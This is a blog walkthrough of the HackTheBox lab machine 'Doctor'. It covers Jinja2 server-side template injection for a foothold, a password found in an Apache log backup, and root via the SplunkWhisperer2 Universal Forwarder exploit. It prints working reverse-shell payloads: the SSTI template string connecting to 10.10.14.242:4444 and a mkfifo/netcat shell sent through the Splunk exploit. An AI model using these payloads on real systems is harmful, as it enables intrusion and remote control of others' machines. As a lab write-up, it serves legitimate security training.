---
title: HackTheBox[DOCTOR]
author: Anurag M
date: 2021-02-06 00:30:00 +0800
categories: [HackTheBox]
tags: [ hackthebox, ssti, splunk, injection, whisperer2 ]
---

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/doctor.png)

Doctor is an easy rated CTF style machine at [Hackthebox](https://hackthebox.eu), featuring Server Side Template Injection(SSTI) and privilege escalation by exploiting Splunk Universal Forwarder.

## About The Machine

| Name | OS | Difficulty | Creator |
|------|----|------------|---------|
| [Doctor](https://www.hackthebox.eu/home/machines/profile/278)  | Linux | Easy | [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858) |

| Blood | User |
|-------|------|
| User | [JKR](https://www.hackthebox.eu/home/users/profile/77141) |
| Root | [XCT](https://www.hackthebox.eu/home/users/profile/13569) |

## Reconnaissance
### Nmap

```bash
nmap -sC -sV -A 10.10.10.209
```
![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/nmap.png)

We can see that three ports are open on the machine. 22 , 80, which are standard SSH, HTTP, ports respectively. And port 8089 which is default port for splunkd web api.

Let’s take a look at the webpage.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/1.png)

From the home page we can find a domain name `doctors.htb`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/2.png)

Add this domain to our `/etc/hosts` file pointing to `10.10.10.209`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/3.png)

### HTTP

Let's visit the webpage with the hostname.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/4.png)

We can find login page, tried to login using sqli, but it did not work. So I decided to register to the website and login. After logging in we could not find anything interesting in the landing page, so let’s check the source code to find something interesting.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/5.png)

Reviewing the source code we can find that there is a directory called archive which is still under beta testing. Let’s visit the page.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/6.png)

We got nothing, the webpage seems to be blank, So let’s move back to the logged in dashboard. And try submitting a new message.

First let’s try a simple html H1 tag.

`<h1>test</h1>`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/7.png)

And we got the response that our message has been posted.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/8.png)

Now let's check the archive page to see any difference has occured.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/9.png)

We got nothing in response in archive's too. The page was blank again. Now let's check the source of archive again.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/10.png)

We can see that our message has been recorded, but did not execute.

After trying different ways, I found that we can record and execute our message using the following html tag.

`</title></item><h1>test1</h1>`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/11.png)

And the archive page displayed our message.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/12.png)

Let's check the source code again.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/13.png)

Now we know that the webserver is vulnerable to Server Side Template Injection.

Searching the internet about the vulnerability, I came across some interesting articles ::

[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)

[Server Side Template Injection](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34)

And a github repository containing basic injection payloads.

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

First let’s try injecting basic payloads, so that we can be sure that, the webserver is vulnerable to attacks.

As most of the web servers use php, python, java as backened programming language let’s try jinja2 injection.

Let’s try our injection using the following payload.

`{{7*7}}` if the webserver is vulnerable this would result in 49.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/14.png)

Let's post it

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/15.png)

Now let's check the archive page.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/16.png)

We can confirm that the webserver is vulnerable. Now let’s exploit this vulnerability to gain shell on the remote machine.

## Gaining Foothold

Let's use the following payload found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/17.png)

Let's modify the payload with our IP and PORT to gain reverse shell.

```bash
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.242\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
Let's post it as a message

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/18.png)

Check whether the post has been posted.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/19.png)

The post has been created, now let's start our netcat listener on the specified port

```bash
$ nc -nlvp 4444
```
![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/20.png)

Trigger the payload by visiting archive page.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/21.png)

Let's upgrade to a stable shell using following commands.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
```
![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/22.png)

Checking the username of current user using `whoami` command we find that we got shell as `web`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/23.png)

checking the `home` directory we find another user `shaun`, but we do not have access.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/24.png)

## Privilege Escalation

### shaun

Manually enumerating the machine to find log files and backups files. In the `/var/log/apache2/doctors.htb` directory there is a file called `backup`.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/25.png)

Let's check this file to find password for user `shaun` using the following command.

```bash
$ cat backup | grep pass
```

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/26.png)

We can find a password `Guitar123` in the backup file.
Now let's login as user `shaun` using the password `Guitar123`

```bash
$ su shaun
```

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/27.png)

We can find user flag under the directory `/home/shaun`.

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/28.png)

### root

For escalating our privilege to root, let's find interesting permissions, files, or processes running on the machine using [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

LinPEAS is a script that search for possible paths to escalate privileges on Linux/UNIX* hosts.

For that let's transfer the script to the remote machine. For that first start a webserver in our local machine using the following command.

```bash
$ python3 -m http.server 8000
```

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/29.png)

Download the privilege escalation script using `wget`

```bash
$ wget http://YOUR-IP:8000/linpeas.sh
```

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/30.png)

After downloading the script in remote machine

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/31.png)

Provide required permission to run the script using `chmod`

```bash
$ chmod +x linpeas.sh
```

Execute the script

```bash
$ ./linpeas.sh
```

Executing linpeas, we find something interesting

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/32.png)

Splunk is a software platform to search, analyze and visualize the machine-generated data gathered from the websites, applications, sensors, devices etc. And splunkd is a system process that handles indexing, searching, forwarding.

Searching the internet we can find that we could escalate privilege using [Splunk Universal Forwarder Misconfiguration](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)

Again researching more on the vulnerability I came across a github repository with an [exploit](https://github.com/cnotin/SplunkWhisperer2)

The repository contained information about the vulnerability and a python script to exploit the vulnerability.

[PySplunkWhisperer2_remote.py](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)

Download the exploit.

Let's start our netcat listener on desired port and execute the script using the following payload, The payload is modified referencing to the article given [here](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

Payload

```bash
python3 PySplunkWhisperer2_remote.py --lhost YOUR IP --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/vincida;mkfifo /tmp/vincida;cat /tmp/vincida|/bin/sh -i 2>&1|nc YOUR IP 1337>/tmp/vincida"'
```

Execute the `PySplunkWhisperer2_remote.py` with netcat listening on specified port.

```bash
$ nc -nlvp 1337
```

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/33.png)

And we are root now. Find the root flag in `/root` directory

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/doctor/34.png)

## Resources

| Topic | Url |
|-------|-----|
| Server-Side Template Injection | [Click here](https://portswigger.net/research/server-side-template-injection) |
| Server Side Template Injection | [Click here](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34) |
| PayloadsAllTheThings | [Click here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) |
| LinPEAS | [Click here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
| Splunk Universal Forwarder Misconfiguration | [Click here](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)
| SplunkWhisperer2 | [Click here](https://github.com/cnotin/SplunkWhisperer2)
| Exploit | [Click here](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)
| Abusing Splunk Forwarders For Shells and Persistence | [Click here](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
